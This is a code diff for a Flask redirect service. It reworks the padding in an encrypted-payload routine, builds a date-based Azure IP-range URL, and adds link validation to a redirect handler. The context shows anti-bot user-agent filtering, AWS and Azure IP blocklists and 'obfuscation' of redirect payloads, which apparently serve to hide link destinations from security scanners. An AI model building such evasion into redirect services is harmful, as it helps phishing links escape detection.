@@ -52,7 +52,11 @@ DATA_RETENTION_DAYS = 90
 USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
 BLOCKLIST_URL = "https://raw.githubusercontent.com/stamparm/ipsum/master/ipsum.txt"
 AWS_CIDR_URL = "https://ip-ranges.amazonaws.com/ip-ranges.json"
-AZURE_CIDR_URL = "https://download.microsoft.com/download/7/1/D/71D86715-5596-4529-9B13-DA13A5DE5B63/ServiceTags_Public_20250623.json"
+def get_azure_cidr_url():
+    base_url = "https://download.microsoft.com/download/7/1/D/71D86715-5596-4529-9B13-DA13A5DE5B63/ServiceTags_Public_"
+    date_str = datetime.now().strftime("%Y%m%d")
+    return f"{base_url}{date_str}.json"
+AZURE_CIDR_URL = get_azure_cidr_url()
 
 # Anti-bot settings
 SUSPICIOUS_UA_PATTERNS = [
@@ -344,29 +348,35 @@ def dynamic_rate_limit(base_limit=5, base_per=60):
 # Payload encryption and obfuscation
 def encrypt_payload(payload):
     try:
-        # Add random padding
-        padding = secrets.token_bytes(random.randint(8, MAX_PAYLOAD_PADDING))
-        padded_payload = json.dumps({
+        # Convert payload to JSON and encode
+        payload_bytes = json.dumps({
             "data": payload,
             "decoy": secrets.token_hex(16),
             "timestamp": int(time.time())
-        }).encode() + padding
-
-        # Base64 encode for UTF-8 safety
+        }).encode('utf-8')
+        
+        # Generate random padding and store its length
+        padding_length = random.randint(8, MAX_PAYLOAD_PADDING)
+        padding = secrets.token_bytes(padding_length)
+        
+        # Prepend padding length (as 4-byte integer) to payload
+        padded_payload = len(padding).to_bytes(4, 'big') + payload_bytes + padding
+        
+        # Base64 encode for safe transport
         b64_payload = base64.urlsafe_b64encode(padded_payload)
-
+        
         # AES-GCM encryption
         iv = secrets.token_bytes(12)
         cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv), backend=default_backend())
         encryptor = cipher.encryptor()
         ciphertext = encryptor.update(b64_payload) + encryptor.finalize()
         encrypted = iv + ciphertext + encryptor.tag
-
+        
         # HMAC signature
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
         h.update(encrypted)
         signature = h.finalize()
-
+        
         result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
         logger.debug(f"Encrypted payload: {result[:20]}...")
         return result
@@ -381,12 +391,12 @@ def decrypt_payload(encrypted):
             raise ValueError("Invalid payload format")
         encrypted_data = base64.urlsafe_b64decode(parts[0])
         signature = base64.urlsafe_b64decode(parts[1])
-
+        
         # Verify HMAC
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
         h.update(encrypted_data)
         h.verify(signature)
-
+        
         # AES-GCM decryption
         iv = encrypted_data[:12]
         tag = encrypted_data[-16:]
@@ -394,10 +404,22 @@ def decrypt_payload(encrypted):
         cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv, tag), backend=default_backend())
         decryptor = cipher.decryptor()
         b64_payload = decryptor.update(ciphertext) + decryptor.finalize()
-
+        
         # Decode base64
         padded_payload = base64.urlsafe_b64decode(b64_payload)
-        payload_json = json.loads(padded_payload.decode().split('}')[0] + '}')
+        
+        # Extract padding length and separate payload
+        if len(padded_payload) < 4:
+            raise ValueError("Invalid payload: too short")
+        padding_length = int.from_bytes(padded_payload[:4], 'big')
+        if padding_length > MAX_PAYLOAD_PADDING or len(padded_payload) < 4 + padding_length:
+            raise ValueError("Invalid padding length")
+        
+        # Extract JSON payload (excluding padding length and padding)
+        payload_bytes = padded_payload[4:-padding_length]
+        
+        # Decode JSON
+        payload_json = json.loads(payload_bytes.decode('utf-8'))
         result = payload_json['data']
         logger.debug(f"Decrypted payload: {result[:50]}...")
         return result
@@ -883,6 +905,27 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         logger.debug(f"Redirect handler: username={username}, endpoint={endpoint}, payload={encrypted_payload[:20]}...")
         url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
 
+        # Validate payload length
+        if not encrypted_payload or len(encrypted_payload) < 32:
+            logger.warning(f"Invalid payload length: {len(encrypted_payload)}")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Invalid Link</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                </head>
+                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
+                        <p class="text-gray-600">The link is invalid or has expired. Please try generating a new link or contact support.</p>
+                    </div>
+                </body>
+                </html>
+            """), 400
+
         # Random delay
         time.sleep(random.uniform(0.1, 0.5))
 
@@ -946,7 +989,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 if valkey_client:
                     valkey_client.delete(f"url_payload:{url_id}")
                 abort(410, "URL has expired")
-        except Exception as e:
+        except json.JSONDecodeError as e:
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
             abort(400, "Invalid payload")
 
@@ -1002,6 +1045,10 @@ def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
             </body>
             </html>
         """, error=str(e)), 500
+
+@app.route("/favicon.ico")
+def favicon():
+    return '', 204
 
 @app.route("/<path:path>", methods=["GET"])
 def catch_all(path):
